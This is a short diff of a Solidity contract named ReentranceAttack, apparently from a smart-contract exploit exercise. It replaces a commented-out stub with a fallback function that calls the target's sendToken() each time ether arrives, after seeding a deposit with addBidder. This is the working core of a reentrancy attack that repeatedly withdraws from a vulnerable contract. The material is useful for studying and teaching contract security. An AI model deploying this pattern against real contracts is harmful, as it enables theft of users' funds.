@@ -15,5 +15,7 @@ contract ReentranceAttack {
         target.addBidder{value: 0.01 ether}();
     }
 
-    // function() external payable {};
+    fallback() external payable {
+        target.sendToken();
+    }
 }
